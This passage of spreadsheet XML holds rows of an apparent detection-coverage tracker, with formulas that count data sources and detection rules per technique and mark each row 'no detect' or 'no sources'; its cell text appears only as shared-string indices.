        <v>386</v>
      </c>
      <c r="U216" t="s">
        <v>1221</v>
      </c>
      <c r="V216" t="s">
        <v>1222</v>
      </c>
      <c r="W216" t="b">
        <v>1</v>
      </c>
      <c r="X216" t="s">
        <v>1204</v>
      </c>
    </row>
    <row r="217" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A217" t="s">
        <v>1204</v>
      </c>
      <c r="B217" t="s">
        <v>1223</v>
      </c>
      <c r="C217" t="s">
        <v>314</v>
      </c>
      <c r="D217" t="s">
        <v>747</v>
      </c>
      <c r="E217" t="s">
        <v>1224</v>
      </c>
      <c r="F217" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G217" s="9" cm="1">
        <f t="array" ref="G217">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H217" s="9" t="str" cm="1">
        <f t="array" ref="H217">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I217" s="9" t="str" cm="1">
        <f t="array" ref="I217">IF(SUM(IF($C217=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C217=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J217" s="9" t="str" cm="1">
        <f t="array" ref="J21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17" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M217" s="9" cm="1">
        <f t="array" ref="M217">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N217" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O217" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P217" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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17" t="s">
        <v>386</v>
      </c>
      <c r="U217" t="s">
        <v>1225</v>
      </c>
      <c r="V217" t="s">
        <v>1226</v>
      </c>
      <c r="W217" t="b">
        <v>1</v>
      </c>
      <c r="X217" t="s">
        <v>1204</v>
      </c>
    </row>
    <row r="218" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A218" t="s">
        <v>1227</v>
      </c>
      <c r="B218" t="s">
        <v>1227</v>
      </c>
      <c r="C218" t="s">
        <v>173</v>
      </c>
      <c r="D218" t="s">
        <v>8</v>
      </c>
      <c r="E218" t="s">
        <v>434</v>
      </c>
      <c r="F218" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G218" s="9" cm="1">
        <f t="array" ref="G218">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H218" s="9" cm="1">
        <f t="array" ref="H218">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I218" s="9" t="str" cm="1">
        <f t="array" ref="I218">IF(SUM(IF($C218=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C218=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J218" s="9" t="str" cm="1">
        <f t="array" ref="J21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18" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M218" s="9" cm="1">
        <f t="array" ref="M218">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N218" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O218" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P218" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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18" t="s">
        <v>368</v>
      </c>
      <c r="U218" t="s">
        <v>1228</v>
      </c>
      <c r="V218" t="s">
        <v>1229</v>
      </c>
      <c r="W218" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="219" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A219" t="s">
        <v>1230</v>
      </c>
      <c r="B219" t="s">
        <v>1230</v>
      </c>
      <c r="C219" t="s">
        <v>93</v>
      </c>
      <c r="D219" t="s">
        <v>4</v>
      </c>
      <c r="E219" t="s">
        <v>1231</v>
      </c>
      <c r="F219" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G219" s="9" cm="1">
        <f t="array" ref="G219">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H219" s="9" cm="1">
        <f t="array" ref="H219">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I219" s="9" t="str" cm="1">
        <f t="array" ref="I219">IF(SUM(IF($C219=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C219=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J219" s="9" cm="1">
        <f t="array" ref="J21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219" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M219" s="9" cm="1">
        <f t="array" ref="M219">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N219" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O219" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P219" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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19" t="s">
        <v>979</v>
      </c>
      <c r="U219" t="s">
        <v>1232</v>
      </c>
      <c r="V219" t="s">
        <v>1233</v>
      </c>
      <c r="W219" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="220" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A220" t="s">
        <v>1230</v>
      </c>
      <c r="B220" t="s">
        <v>1234</v>
      </c>
      <c r="C220" t="s">
        <v>313</v>
      </c>
      <c r="D220" t="s">
        <v>4</v>
      </c>
      <c r="E220" t="s">
        <v>1231</v>
      </c>
      <c r="F220" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G220" s="9" cm="1">
        <f t="array" ref="G220">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H220" s="9" t="str" cm="1">
        <f t="array" ref="H220">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I220" s="9" t="str" cm="1">
        <f t="array" ref="I220">IF(SUM(IF($C220=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C220=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J220" s="9" t="str" cm="1">
        <f t="array" ref="J22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20" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M220" s="9" cm="1">
        <f t="array" ref="M220">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N220" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O220" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P220" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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20" t="s">
        <v>991</v>
      </c>
      <c r="U220" t="s">
        <v>1235</v>
      </c>
      <c r="V220" t="s">
        <v>1236</v>
      </c>
      <c r="W220" t="b">
        <v>1</v>
      </c>
      <c r="X220" t="s">
        <v>1230</v>
      </c>
    </row>
    <row r="221" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A221" t="s">
        <v>1230</v>
      </c>
      <c r="B221" t="s">
        <v>1237</v>
      </c>
      <c r="C221" t="s">
        <v>277</v>
      </c>
      <c r="D221" t="s">
        <v>4</v>
      </c>
      <c r="E221" t="s">
        <v>1231</v>
      </c>
      <c r="F221" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G221" s="9" cm="1">
        <f t="array" ref="G221">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H221" s="9" t="str" cm="1">
        <f t="array" ref="H221">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I221" s="9" t="str" cm="1">
        <f t="array" ref="I221">IF(SUM(IF($C221=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C221=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J221" s="9" t="str" cm="1">
        <f t="array" ref="J22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21" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M221" s="9" cm="1">
        <f t="array" ref="M221">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N221" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O221" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P221" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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21" t="s">
        <v>368</v>
      </c>
      <c r="U221" t="s">
        <v>1238</v>
      </c>
      <c r="V221" t="s">
        <v>1239</v>
      </c>
      <c r="W221" t="b">
        <v>1</v>
      </c>
      <c r="X221" t="s">
        <v>1230</v>
      </c>
    </row>
    <row r="222" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A222" t="s">
        <v>1230</v>
      </c>
      <c r="B222" t="s">
        <v>1240</v>
      </c>
      <c r="C222" t="s">
        <v>244</v>
      </c>
      <c r="D222" t="s">
        <v>4</v>
      </c>
      <c r="E222" t="s">
        <v>642</v>
      </c>
      <c r="F222" s="9">
        <f t="shared" si="3"/>
        <v>1</v>
      </c>
      <c r="G222" s="9" cm="1">
        <f t="array" ref="G222">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H222" s="9" t="str" cm="1">
        <f t="array" ref="H222">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I222" s="9" t="str" cm="1">
        <f t="array" ref="I222">IF(SUM(IF($C222=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C222=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J222" s="9" t="str" cm="1">
        <f t="array" ref="J22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22" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M222" s="9" cm="1">
        <f t="array" ref="M222">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N222" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O222" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P222" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S22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22" t="s">
        <v>517</v>
      </c>
      <c r="U222" t="s">
        <v>1241</v>
      </c>
      <c r="V222" t="s">
        <v>1242</v>
      </c>
      <c r="W222" t="b">
        <v>1</v>
      </c>
      <c r="X222" t="s">
        <v>1230</v>
      </c>
    </row>
    <row r="223" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A223" t="s">
        <v>1243</v>
      </c>
      <c r="B223" t="s">
        <v>1243</v>
      </c>
      <c r="C223" t="s">
        <v>159</v>
      </c>
      <c r="D223" t="s">
        <v>4</v>
      </c>
      <c r="E223" t="s">
        <v>1244</v>
      </c>
      <c r="F223" s="9">
        <f t="shared" si="3"/>
        <v>8</v>
      </c>
      <c r="G223" s="9" cm="1">
        <f t="array" ref="G223">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H223" s="9" cm="1">
        <f t="array" ref="H223">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>6</v>
      </c>
      <c r="I223" s="9" t="str" cm="1">
        <f t="array" ref="I223">IF(SUM(IF($C223=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C223=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J223" s="9" cm="1">
        <f t="array" ref="J22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223" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>6</v>
      </c>
      <c r="M223" s="9" cm="1">
        <f t="array" ref="M223">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>6</v>
      </c>
      <c r="N223" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O223" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P223" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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23" t="s">
        <v>1023</v>
      </c>
      <c r="U223" t="s">
        <v>1245</v>
      </c>
      <c r="V223" t="s">
        <v>1246</v>
      </c>
      <c r="W223" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="224" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A224" t="s">
        <v>1243</v>
      </c>
      <c r="B224" t="s">
        <v>1247</v>
      </c>
      <c r="C224" t="s">
        <v>235</v>
      </c>
      <c r="D224" t="s">
        <v>4</v>
      </c>
      <c r="E224" t="s">
        <v>1248</v>
      </c>
      <c r="F224" s="9">
        <f t="shared" si="3"/>
        <v>6</v>
      </c>
      <c r="G224" s="9" cm="1">
        <f t="array" ref="G224">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H224" s="9" t="str" cm="1">
        <f t="array" ref="H224">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I224" s="9" t="str" cm="1">
        <f t="array" ref="I224">IF(SUM(IF($C224=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C224=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J224" s="9" t="str" cm="1">
        <f t="array" ref="J22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24" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M224" s="9" cm="1">
        <f t="array" ref="M224">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N224" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O224" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P224" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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24" t="s">
        <v>1023</v>
      </c>
      <c r="U224" t="s">
        <v>1249</v>
      </c>
      <c r="V224" t="s">
        <v>1250</v>
      </c>
      <c r="W224" t="b">
        <v>1</v>
      </c>
      <c r="X224" t="s">
        <v>1243</v>
      </c>
    </row>
    <row r="225" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A225" t="s">
        <v>1243</v>
      </c>
      <c r="B225" t="s">
        <v>1251</v>
      </c>
      <c r="C225" t="s">
        <v>1252</v>
      </c>
      <c r="D225" t="s">
        <v>4</v>
      </c>
      <c r="E225" t="s">
        <v>1253</v>
      </c>
      <c r="F225" s="9">
        <f t="shared" si="3"/>
        <v>7</v>
      </c>
      <c r="G225" s="9" cm="1">
        <f t="array" ref="G225">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H225" s="9" t="str" cm="1">
        <f t="array" ref="H225">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I225" s="9" t="str" cm="1">
        <f t="array" ref="I225">IF(SUM(IF($C225=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C225=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J225" s="9" t="str" cm="1">
        <f t="array" ref="J22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25" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M225" s="9" cm="1">
        <f t="array" ref="M225">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N225" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O225" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P225" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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25" t="s">
        <v>1023</v>
      </c>
      <c r="U225" t="s">
        <v>1254</v>
      </c>
      <c r="V225" t="s">
        <v>1255</v>
      </c>
      <c r="W225" t="b">
        <v>1</v>
      </c>
      <c r="X225" t="s">
        <v>1243</v>
      </c>
    </row>
    <row r="226" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A226" t="s">
        <v>1243</v>
      </c>
      <c r="B226" t="s">
        <v>1256</v>
      </c>
      <c r="C226" t="s">
        <v>336</v>
      </c>
      <c r="D226" t="s">
        <v>4</v>
      </c>
      <c r="E226" t="s">
        <v>1257</v>
      </c>
      <c r="F226" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G226" s="9" cm="1">
        <f t="array" ref="G226">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H226" s="9" t="str" cm="1">
        <f t="array" ref="H226">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I226" s="9" t="str" cm="1">
